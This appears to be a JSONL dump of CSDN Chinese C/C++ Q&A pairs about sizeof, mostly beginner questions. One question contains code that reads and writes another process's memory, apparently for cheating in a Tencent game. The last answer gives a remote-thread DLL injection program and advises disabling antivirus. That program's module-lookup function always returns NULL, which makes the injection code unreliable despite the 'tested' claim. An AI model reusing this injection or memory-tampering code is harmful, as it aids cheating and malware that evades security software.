{"Answer": "&lt;p&gt;改进了一下&amp;#xff1a;&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;void main()\n{\n    char a[100];\n    printf(&amp;#34;Please input several characters:&amp;#34;);\n    gets_s(a,100);\n\n    for (int i &amp;#61; 0; a[i] !&amp;#61; &amp;#39;\\0&amp;#39;; i&amp;#43;&amp;#43;)\n        printf(&amp;#34;%c &amp;#34;, a[i]);\n}&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["自己设计的一个将输入的字符串分成一个一个字符输出，不知道为什么老是有问题，大佬们帮忙看看。", ["#include<stdio.h>", "\nvoid main()", "\n{int i,n;", "\nchar a[100];", "\nprintf(\"Please input several characters:\");", "\ngets(a);", "\nn=sizeof(a)/sizeof(char);", "\nfor(i=0;i<n-5;i++)", "\n    printf(\"%c \",a[i]);", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;code class=\"language-javascript\"&gt;str&lt;/code&gt;是一个字符数组&amp;#xff0c;其类型是&lt;code class=\"language-javascript\"&gt;char [16]&lt;/code&gt;&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;sizeof&lt;/code&gt;一个数组返回的是数组所占的内存大小&amp;#xff08;字节数&amp;#xff09;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么打印出来的第一行不是8而是16呢？", ["#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<string.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n        ", "char", " str[] = ", "\"Welcome to CSDN\"", ";\n\n        str[", "7", "] = ", "'\\0'", ";\n\n        ", "printf", "(", "\"sizeof str = %d\\n\"", ", ", "sizeof", "(str));\n        ", "printf", "(", "\"strlen str = %d\\n\"", ", ", "strlen", "(str));\n\n        ", "return", " ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;只有输出的时候能控制位数&amp;#xff0c;返回函数值时&amp;#xff0c;是控制不了的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言中 如何控制返回值中double的小数位数？", ["c语言中 如何控制返回值中double的小数位数？", "如：", "\n", "int i = ", "0", ",", "sum", ";\n    double ave = ", "0", ";\n    int ", "length", " = sizeof(", "array", ") / sizeof(", "array", "[", "0", "]);\n    ", "for", " (i = ", "0", "; i < ", "length", "; i++)\n    {\n        ", "sum", " += ", "array", "[i];\n    }\n    ave = ", "sum", " / ", "length", ";\n    ", "return", " ave;\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;那就已其中一个链表为基础&amp;#xff0c;将另一个链表的所有节点按序插入就可以了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["两个递增单链表合成一个递增单链表，要求结果链表仍使用原来两个链表的空间，不另外占用其他空间。但是最后新链表只有两个元素，看看问题出在哪里，在我原有代码基础上修改", ["\n\n#include<stdio.h>\n#include<stdlib.h>\n", "/*实验三*/", "\n\n\ntypedef struct Node{\n    int num;\n    struct Node *next;\n\n}node,*Linklist;\n\n\n node *StartList(node *head)\n {\n\n\n     head=(node*)malloc(sizeof(node));\n     ", "head", "->", "next=NULL;\n\n     return head;\n }\n\nvoid insert_num(node *A,int x) ", "/*排序函数*/", "\n\n{\n\n    node *Q;\n\n    ", "while", "(A->", "next", "!=NULL&&A->", "next", "->", "num<x)\n    A=A->next;\n    Q=(node*)malloc(sizeof(node));\n    Q->num=x;\n    Q->", "next", "=A->", "next;\n    A->next=Q;\n\n}\n\n\nLinklist link_node(Linklist pA,Linklist pB)", "/*合并两个单链表*/", "\n\n{\n Linklist a,b;\n Linklist L3;\n\n ", "a", "=pA->", "next;\n ", "b", "=pB->", "next;\n node  *q;\n L3=pA;\n\n\n", "while", "(a->", "next", "!=NULL&&b->", "next!=NULL)\n{\n    ", "if", "(a->", "next", "->", "num", "<b->", "next", "->", "num)\n    {\n        ", "q", "=a->", "next;\n        ", "a", "->", "next", "=q->", "next;", "/*将结点删除*/", "\n        ", "q", "->", "next", "=L3->", "next;\n        L3->next=q;\n        L3=L3->next;\n    }\n    ", "else", " ", "if", "(a->", "next", "->", "num", ">b->", "next", "->", "num)\n    {\n        ", "q", "=b->", "next;\n        ", "b", "->", "next", "=q->", "next;", "/*将结点删除*/", "\n        ", "q", "->", "next", "=L3->", "next;\n        L3->next=q;\n        L3=L3->next;\n\n    }\n\n}\n\n ", "if", "(a->", "next!=NULL){\n            L3->", "next", "=a->", "next;\n            ", "a", "->", "next=NULL;\n    }\n    ", "if", "(b->", "next!=NULL){\n            L3->", "next", "=b->", "next;\n            ", "b", "->", "next=NULL;\n    }\n    return L3;\n}\nvoid print_node(node *E)\n{\n\n    ", "while", "(E->", "next!=NULL)\n    {\n      ", "printf", "(\"%d \",E->", "next", "->", "num);\n      E=E->next;\n    }\n}\n\n\nint main()\n{\n    node *L;\n\n    node *L1,*L2;\n    L1=StartList(L1);\n    L2=StartList(L2);\n\n    int X1,X2;\n    printf(", "\"输入第一个链表元素\\n\"", ");\n    ", "for", "(int L=", "0", ";L<", "3", ";L++)\n    {scanf(", "\"%d\"", ",&X1);\n    insert_num(L1,X1);\n    }\n    print_node(L1);\n    printf(", "\"\\n\"", ");\n\n    printf(", "\"输入第二个链表元素\\n\"", ");\n    ", "for", "(int l=", "0", ";l<", "3", ";l++)\n    {\n    scanf(", "\"%d\"", ",&X2);\n    insert_num(L2,X2);\n    }\n    print_node(L2);\n    printf(", "\"\\n\"", ");\n\n\n     printf(", "\"新链表元素为：\\n\"", ");\n    L=link_node(L1,L2);\n    print_node(L);\n\n\n\n\n\n}\n![img](https:", "//img-mid.csdnimg.cn/release/static/image/mid/ask/156092020436111.png \"=600 #left\")", "\n"]], "Tag": "程序设计"}
{"Answer": "C语言 realloc() 函数位于 stdlib.h 头文件中，其原型为：\r\n    void *realloc(void *ptr, size_t size);\r\n设之前内存块的大小为 n，如果 size &lt; n，那么截取的内容不会发生变化，如果 size &gt; n，那么新分配的内存不会被初始化。\r\n所以你这里应该是20", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言realloc函数小问题", ["首先我申请了长度为10的空间", "\nint ", "p", "\n       p=(int", ")malloc(10*sizeof(int));", "\n            我想把长度延长为20 且原来的数据要保留", "\n            p=(int*)realloc(p,a*sizeof(int)); 这个a应该是10 还是 20", "\n            感谢各位大神解答"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为这四个选项中&amp;#xff0c;sizeof是C语言关键字&amp;#xff0c;关键字不能作为变量名。&lt;/p&gt;\n&lt;p&gt;main和scanf只有带()的时候是&lt;strong&gt;函数&lt;/strong&gt;&amp;#xff0c;没有括号的时候&amp;#xff0c;不是函数&amp;#xff0c;也不是C语言关键字&amp;#xff0c;可以做变量名。float是类型&amp;#xff0c;但_float不是C语言基础类型&amp;#xff0c;所以也可以作为变量名。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;C语言关键字&amp;#xff1a;&lt;/strong&gt;&lt;br /&gt;auto、break、case、char、const、continue、default、do、double、else、enum、extern、float、for、goto、if、int、long、register、return、short、signed、&lt;strong&gt;sizeof&lt;/strong&gt;、static、struct、switch、typedef、union、unsigned、void、volatile、while、inline、restrict、_Bool、_Complex、_Imaginary、_Alignas、_Alignof、_Atomic、_Static_assert、_Noreturn、_Thread_local、_Generic。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言变量名命名规则，为什么书上答案给的D", ["以下标识符中不能作变量名的是（）", "A main B scanf C _float D sizeof"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你在输入数据的时候&amp;#xff0c;调用这个函数了吗&amp;#xff1f;或者应该就这个计算长度的放在输入函数中&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这个代码不执行", ["void caulen(linklist head)", "{", "    int len=0;", "    linklist p;", "    head=(linklist)malloc(sizeof(lnode));", "    p=(linklist)malloc(sizeof(lnode));", "    p=p->next;", "    while(p!=NULL)", "    {", "        len++;", "    }", "    printf(\"长度为%d\",len);", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第一个分配100个字节的内存&lt;br /&gt;第二个分配25个int类型所占字节的大小&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这两种写法有什么区别", ["第一种\n", "malloc", "(", "100", ");\n第二种\n", "malloc", "(", "25", "*", "sizeof", "(", "int", "));\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;握草&amp;#xff08;C&amp;#43;&amp;#43;&amp;#xff09;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["帮我看看我应该学哪种语言才能做出这个", ["当然，如果你正常遍历的话是发现不了虚拟地址的，因为一般使用的读写函数是syscall下的read，这个api呢是读的物理地址", "所以第二种则是使用linux的函数“pagemap”将物理地址转换为“缺页地址”，从而去过滤掉“缺页地址”", "以下这段就是pagemap实现的整个函数方法", "\n", "class pagemap", "{", "  private:", "  int pagemap_fd;", "     int ipid = -1;", "\n", " // uint64_t page_size;", "  public:", " bool init(int pid)", " {", "\n", "char pagemap_file[BUFSIZ];", "    snprintf(pagemap_file, sizeof(pagemap_file), \"/proc/%d/pagemap\", pid);", "  //  pagemap_fd = open(pagemap_file, O_RDONLY);", "  pagemap_fd=syscall(__NR_openat,AT_FDCWD,pagemap_file,O_RDONLY,777);", "  //     int fd=syscall(__NR_openat,AT_FDCWD,pagemap_file,O_RDONLY,777);", "    if (pid < 0) {", "        return false;", "    }", "    if (this->pagemap_fd < 0) {", "        return 1;", "    }", "\n", "  if (!f)", "  {", "   return false;", "  }*/", "        this->ipid=pid;", "  return true;", " }", "\n", "bool isVirtualAddress(long int address) {", " //  WARNING: Already detected by tencent", "\n", "int", " pageSize = ", "getpagesize", "();\n", "unsigned", " ", "long", " v_pageIndex = address / pageSize;            ", "//虚地址页数", "\n", "unsigned", " ", "long", " v_offset = v_pageIndex * ", "sizeof", "(", "uint64_t", ");  ", "//计算在/proc/pid/page_map文件中的偏移量", "\n", "unsigned", " ", "long", " page_offset = address % pageSize;            ", "//计算虚拟地址在页面中的偏移量", "\n", "uint64_t", " item = ", "0", ";                                        ", "//存储对应项的值", "\n", "\n", "//    long int var[1] = { 0 };", " vm_readv(v_offset, &item, sizeof(uint64_t));", "// pread(pagemap_fd, &item, sizeof(uint64_t), v_offset);", " if ((((uint64_t) 1 << 63) & item) != 0)", "  {", "   return false;", "  }", "  else", "  {", "   return true;", "  }", "  return item;", "   }", "\n", " void closer()", " {", "  close(this->pagemap_fd);", "\n", " }", "\n", " int getDword(long int addr)", " {", "if (!isVirtualAddress(addr) || addr <= 0)", "  {", "   return 0;", "  }", "  else", "  {", "   long int var[1] = { 0 };", "   vm_readv(addr, var, 8);", "   return var[0];", "  }", " }", "\n", " /* 读浮点型内存 */", "\n", " float getFloat(long int addr)", " {", "  if (!isVirtualAddress(addr) || addr <= 0)", "  {", "   return 0;", "  }", "  else", "  {", "   float var[1] = { 0 };", "   vm_readv(addr, var, 8);", "   return var[0];", "  }", " }", "\n", " long int getZZ(long int addr)", " {", "if (!isVirtualAddress(addr) || addr <= 0)", "  {", "   return 0;", "  }", "  else", "  {", "   long int var[1] = { 0 };", "   vm_readv(addr, var, 8);", "  // printf（\"%lx\\n\",addr);", "\n", "   return var[0];", "  }", " }", "\n", " long int getword(long int addr)", " {", "  if (!isVirtualAddress(addr) || addr <= 0)", "  {", "   return 0;", "  }", "  else", "  {", "   long int var[1] = { 0 };", "   vm_readv(addr, var, 2);", "   return var[0];", "  }", " }", "\n", "float WriteFloat(long int addr, float value)", "{", " vm_writev(addr, &value, 4);", "\n", "}", "\n", " int WriteDword(long int addr, int value)", "{", "\n", " vm_writev(addr, &value, 4);", "\n", "}", "\n", "};"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;32位&amp;#xff0c;sizeof得出来的是字节数&amp;#xff0c;一个字节 8位&amp;#xff0c;4个字节就是32位&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["解决一下这个题目，需要解析，", ["若sizeof(int)等于4，则一个int型数据有()位（bit）"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;花了点时间改了一下&amp;#xff0c;亲测成功了&amp;#xff0c;希望采纳&amp;#xff01;&lt;br /&gt;没成功的问题有好几个&amp;#xff0c;概括一下&amp;#xff1a;&lt;br /&gt;1、你调用的库(L&amp;#34;kernel.dll&amp;#34;); 改为(L&amp;#34;kernel32.dll&amp;#34;);&lt;br /&gt;2、hMod &amp;#61; GetModuleHandleW(L&amp;#34;kernel32.dll&amp;#34;); 需要改成hMod &amp;#61; GetRemoteHandle(dwPID, hProcess);&amp;#xff0c;这是最大的问题&amp;#xff0c;应该是从远程进程查找kernel32.dll&amp;#xff0c;而不是从本进程查找&amp;#xff1b;&lt;br /&gt;3、需要编译x64位版本&amp;#xff08;如果你是32位&amp;#xff0c;你就编译32位&amp;#xff09;&amp;#xff1b;&lt;br /&gt;4、需要关闭360&amp;#xff0c;这也是必须的&amp;#xff0c;之前一直没出来&amp;#xff0c;关闭了360 &amp;#xff0c;就出来了。应该是360禁止了进程注入。&lt;br /&gt;下面是成功的运行界面&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img width=\"600px\" align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/28604246813616.png\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;最后不说废话&amp;#xff0c;上代码&amp;#xff1a;&lt;br /&gt;//主程序&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;#34;tchar.h&amp;#34;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;psapi.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\nHMODULE GetRemoteHandle(DWORD dwProcessId, HANDLE hProcess)\n{\n    HMODULE* phMods &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    &lt;span class=\"hljs-comment\"&gt;//HANDLE hProcess &amp;#61; NULL;&lt;/span&gt;\n    HMODULE hRet &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    DWORD dwNeeded &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    DWORD i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    TCHAR szModName[MAX_PATH] &amp;#61; {};\n\n    &lt;span class=\"hljs-comment\"&gt;//hProcess &amp;#61; OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;/*if (NULL &amp;#61;&amp;#61; hProcess)\n    {\n        printf(&amp;#34;不能打开进程[ID:0x%x]句柄,错误码:0x%08x\\n&amp;#34;, dwProcessId);\n        return;\n    }*/&lt;/span&gt;\n\n    EnumProcessModules(hProcess, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &amp;amp;dwNeeded);\n    phMods &amp;#61; (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwProcessId);\n\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (EnumProcessModules(hProcess, phMods, dwNeeded, &amp;amp;dwNeeded))\n    {\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; (dwNeeded / &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(HMODULE)); i&amp;#43;&amp;#43;)\n        {\n            ZeroMemory(szModName, MAX_PATH * &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(TCHAR));\n            &lt;span class=\"hljs-comment\"&gt;//在这如果使用GetModuleFileName&amp;#xff0c;有的模块名称获取不到&amp;#xff0c;函数返回无法找到该模块的错误&lt;/span&gt;\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (GetModuleFileNameEx(hProcess, phMods[i], szModName, MAX_PATH))\n            {\n                &lt;span class=\"hljs-comment\"&gt;//printf(&amp;#34;%ws\\n&amp;#34;, szModName);&lt;/span&gt;\n\n                std::wstring str(szModName);\n                &lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; pos &amp;#61; str.find(_T(&lt;span class=\"hljs-string\"&gt;&amp;#34;KERNEL32&amp;#34;&lt;/span&gt;));\n                &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pos &amp;gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)\n                {\n                    hRet &amp;#61; phMods[i];\n                    &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n                }\n            }\n        }\n    }\n    HeapFree(GetProcessHeap(), &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, phMods);\n    &lt;span class=\"hljs-comment\"&gt;//CloseHandle(hProcess);&lt;/span&gt;\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n}\n&lt;span class=\"hljs-built_in\"&gt;BOOL&lt;/span&gt; InjectDll(DWORD dwPID, LPCTSTR szDllPath)\n{\n    HANDLE hProcess &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, hTread &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    HMODULE hMod &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//DLL模块&lt;/span&gt;\n    LPVOID pRemoteBuf &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//插入字符串的缓冲区&lt;/span&gt;\n    DWORD dwBufSize &amp;#61; (DWORD)(_tcslen(szDllPath) &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) * &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(TCHAR);&lt;span class=\"hljs-comment\"&gt;//DLL路径字符串大小长度&lt;/span&gt;\n    LPTHREAD_START_ROUTINE pThreadProc;&lt;span class=\"hljs-comment\"&gt;//定义函数指针&lt;/span&gt;\n                                       &lt;span class=\"hljs-comment\"&gt;//使用dwPID获取目标进程(notepad.exe)句柄&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!(hProcess &amp;#61; OpenProcess(PROCESS_ALL_ACCESS, &lt;span class=\"hljs-literal\"&gt;FALSE&lt;/span&gt;, dwPID)))\n    {\n        _tprintf(TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;OpenProcess(%d) failed [%d]\\n&amp;#34;&lt;/span&gt;), dwPID, GetLastError());\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;FALSE&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-comment\"&gt;//在目标进程(notepad.exe)内存中分配szDllName大小的内存&lt;/span&gt;\n    pRemoteBuf &amp;#61; VirtualAllocEx(hProcess, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, dwBufSize, MEM_COMMIT, PAGE_READWRITE);\n    &lt;span class=\"hljs-comment\"&gt;//将myhack.dll路径写入分配的内存&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pRemoteBuf &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;FALSE&lt;/span&gt;;\n    &lt;span class=\"hljs-comment\"&gt;//将DLL路径字符串写入内存地址&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;bool&lt;/span&gt; b&amp;#61;WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;);\n    &lt;span class=\"hljs-comment\"&gt;//获取LoadLibraryW() API的地址&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//hMod &amp;#61; GetModuleHandleW(L&amp;#34;kernel32.dll&amp;#34;); &lt;/span&gt;\n    hMod &amp;#61; GetRemoteHandle(dwPID, hProcess);\n    pThreadProc &amp;#61; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &lt;span class=\"hljs-string\"&gt;&amp;#34;LoadLibraryW&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-comment\"&gt;//在notepad.exe进程中运行线程&lt;/span&gt;\n    HANDLE hThread &amp;#61; CreateRemoteThread(\n        hProcess, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, pThreadProc, pRemoteBuf, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;\n    );\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (hThread &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;FALSE&lt;/span&gt;;\n    WaitForSingleObject(hThread, INFINITE);\n    VirtualFreeEx(hProcess, pRemoteBuf, dwBufSize, MEM_FREE);\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n    system(&lt;span class=\"hljs-string\"&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;TRUE&lt;/span&gt;;\n}\n&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; _tmain(&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; argc, TCHAR *argv[])\n{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (argc !&amp;#61; &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;)\n    {\n        _tprintf(TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;USAGE &amp;#xff1a;%s pid dll_path\\n&amp;#34;&lt;/span&gt;), argv[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-comment\"&gt;//inject DLL&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (InjectDll((DWORD)_tstol(argv[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;]), argv[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;]))\n        wprintf(L&lt;span class=\"hljs-string\"&gt;&amp;#34;InjectDll(%hs) success\\n&amp;#34;&lt;/span&gt;, argv[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;]);\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        wprintf(L&lt;span class=\"hljs-string\"&gt;&amp;#34;InjectDll(%hs) failed\\n&amp;#34;&lt;/span&gt;, argv[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;]);\n    system(&lt;span class=\"hljs-string\"&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;//myhack.dll代码&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;#34;stdafx.h&amp;#34;&lt;/span&gt;&lt;/span&gt;\n\n\n//myhack.cpp 会生成一个DLL文件 用来注入\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;#34;windows.h&amp;#34;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;#34;tchar.h&amp;#34;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\nHMODULE g_hMod &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\nDWORD WINAPI ThreadProc(LPVOID lParam)\n{\n    MessageBox(&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;DLL injection SUCCESS&amp;#34;&lt;/span&gt;), TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;HaHa&amp;#34;&lt;/span&gt;), MB_OK)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n}\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n    HANDLE hThread &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n    g_hMod &amp;#61; (HMODULE)hinstDLL&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;switch&lt;/span&gt; (fdwReason)\n    {\n    &lt;span class=\"hljs-keyword\"&gt;case&lt;/span&gt; DLL_PROCESS_ATTACH:\n        //OutputDebugString(&lt;span class=\"hljs-string\"&gt;&amp;#34;Myhack.dll Injection\\n&amp;#34;&lt;/span&gt;)&lt;span class=\"hljs-comment\"&gt;;//输出字符串&lt;/span&gt;\n        //MessageBox(&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;DLL injection SUCCESS&amp;#34;&lt;/span&gt;), TEXT(&lt;span class=\"hljs-string\"&gt;&amp;#34;HaHa&amp;#34;&lt;/span&gt;), MB_OK)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n\n        hThread &amp;#61; CreateThread(&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, ThreadProc, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n        CloseHandle(hThread)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n        &lt;span class=\"hljs-built_in\"&gt;break&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;TRUE&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Winodws10系统下远程线程DLL注入", ["我是个初学者 最近学习Windows远程线程注入 照着书上理解了一遍 然后实现代码的时候 发现总是不成功", "这个程序功能是让在用户在控制台上向程序输入两个参数 一个是notepad.exe的PID 一个是DLL路径 注入目标DLL后 出现弹窗", "下面展示过程：", "打开记事本", "获取其PID：", "\n", "打开控制台输入命令：", "\n", "没看出什么错误：", "\n", "但记事本进程被关闭 